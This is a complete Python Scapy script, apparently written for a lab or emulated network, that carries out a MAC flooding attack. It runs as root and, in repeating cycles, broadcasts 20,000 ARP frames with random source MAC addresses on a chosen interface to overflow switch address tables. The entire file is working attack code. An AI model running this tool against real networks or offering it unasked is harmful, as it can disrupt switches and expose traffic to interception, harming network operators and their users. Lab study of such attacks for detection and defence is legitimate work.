#!/usr/bin/env python3
from scapy.all import *
import random
import time
import sys
import signal
import logging
import os

# Ensure Scapy is configured to use raw sockets
conf.use_pcap = False

# Setup logging
logging.basicConfig(
    filename='/tmp/mac_flood.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Global flag to control the attack
running = True

def signal_handler(sig, frame):
    global running
    print("\n[*] Interrupt received, stopping attack...")
    logging.info("Interrupt received, stopping attack")
    running = False

signal.signal(signal.SIGINT, signal_handler)

def mac_flood(iface="ws2-eth0", src_ip="10.1.0.2", cycle_duration=10):
    if os.geteuid() != 0:
        print("[!] This script must be run as root. Exiting...")
        logging.error("Script not run as root")
        sys.exit(1)

    available_ifaces = get_if_list()
    print(f"[*] Available interfaces: {available_ifaces}")
    logging.info(f"Available interfaces: {available_ifaces}")
    if iface not in available_ifaces:
        print(f"[!] Interface {iface} not found. Available interfaces: {available_ifaces}")
        logging.error(f"Interface {iface} not found")
        sys.exit(1)

    # Test packet sending
    print("[*] Testing packet sending...")
    logging.info("Testing packet sending")
    try:
        test_mac = RandMAC()
        test_pkt = Ether(src=test_mac, dst="ff:ff:ff:ff:ff:ff", type=0x0806)/ARP(
            op=1, hwsrc=test_mac, psrc=src_ip, hwdst="00:00:00:00:00:00", pdst="10.1.0.255"
        )
        sendp(test_pkt, iface=iface, count=5, verbose=1)
        print("[*] Test packets sent successfully")
        logging.info("Test packets sent successfully")
    except Exception as e:
        print(f"[!] Test packet sending failed: {e}")
        logging.error(f"Test packet sending failed: {e}")
        sys.exit(1)

    global running
    while running:
        print(f"[*] Starting MAC flood attack on {iface} with source IP {src_ip}, cycle duration {cycle_duration} seconds...")
        logging.info(f"Starting MAC flood attack on {iface} with source IP {src_ip}, cycle duration {cycle_duration} seconds")
        total_packets = 20000
        try:
            for i in range(total_packets):
                if not running:
                    break
                src_mac = RandMAC()
                pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff", type=0x0806)/ARP(
                    op=1, hwsrc=src_mac, psrc=src_ip, hwdst="00:00:00:00:00:00", pdst="10.1.0.255"
                )
                sendp(pkt, iface=iface, verbose=0)
                if i % 5000 == 0:
                    print(f"[DEBUG] Sent ARP frame {i} with MAC {src_mac} on {iface}")
                    logging.info(f"Sent ARP frame {i} with MAC {src_mac} on {iface}")
            print("[*] Attack cycle completed, restarting...")
            logging.info("Attack cycle completed, restarting")
        except Exception as e:
            print(f"[!] Error during MAC flood: {e}")
            logging.error(f"Error during MAC flood: {e}")
            time.sleep(1)

        print("[*] Heartbeat: Attack script is still running...")
        logging.info("Heartbeat: Attack script is still running")
        time.sleep(cycle_duration)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 mac_flood.py <interface> <source_ip> <cycle_duration>")
        print("Example: python3 mac_flood.py ws2-eth0 10.1.0.2 10")
        sys.exit(1)

    iface = sys.argv[1]
    src_ip = sys.argv[2]
    cycle_duration = int(sys.argv[3])
    mac_flood(iface, src_ip, cycle_duration)